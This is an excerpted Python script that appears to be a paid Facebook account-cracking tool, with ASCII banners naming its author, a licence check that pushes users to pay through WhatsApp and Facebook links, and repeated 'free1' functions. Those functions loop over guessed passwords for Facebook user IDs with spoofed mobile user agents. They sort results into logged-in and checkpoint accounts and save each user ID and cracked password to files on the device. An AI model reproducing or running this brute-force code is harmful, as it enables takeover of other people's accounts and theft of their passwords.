...
| . ` | | '__/ _ \| '_ \  |    \| '_ \ / _` | '_ \ 
| |\  | | | | (_) | |_) | | |\  \ | | | (_| | | | |
\_| \_/_|_|  \___/|_.__/  \_| \_/_| |_|\__,_|_| |_|
...
â•‘ Creator  : NIROB KHAN                       â•‘
â•‘ Github   : https://github.com/Evu674  â•‘
â•‘ Facebook : NIROB KHAN                            â•‘
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : NIROB KHAN ")
    print("\t  Fb page  : Nirob's COMMUNITY ")
    print("\t  Github   : Evu674")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        _help=uuid.uuid1().hex[:6].upper()+"=NIROB"
        print("\n\t     [ Hello User ]\n")
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=rasel674")
        exit()
...
â•‘ Creator  : NIROB KHAN                                 â•‘
â•‘ Github   : https://github.com/evu674  â•‘
â•‘ Facebook : NIROB KHAN  ðŸ™‚â¤ï¸                â•‘
â•‘ Brothers :            Nirob Bro                            â•‘
â•‘ NOTE     :   Paid ToolðŸ˜“                                    â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  """)                                           
  ...
  os.system('xdg-open https://www.facebook.com/rasel674')
  print("");time.sleep(2)
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+01941223322')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def tnx():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://wa.me/+8801941223322')
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def menu_apikey():
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=rasel674");xyz()
    elif hamii in ["3","03"]:
...
def free1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\r\033[1;32m[NIROB-OK] '+uid+' [âˆš] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/NIROB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    print('\r\033[1;34m[NIROB] '+uid+' [~] '+ps+' ')
                    open('/sdcard/NIROB.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[NIROB-CP] '+uid+' [Ã—] '+ps+ ' ')
                    open('/sdcard/NIROB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[NIROB ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            bi = random.choice([A])
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[NIROB ðŸ”¥] [%s] \33[1;97m[OK:%s{NIROB2}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
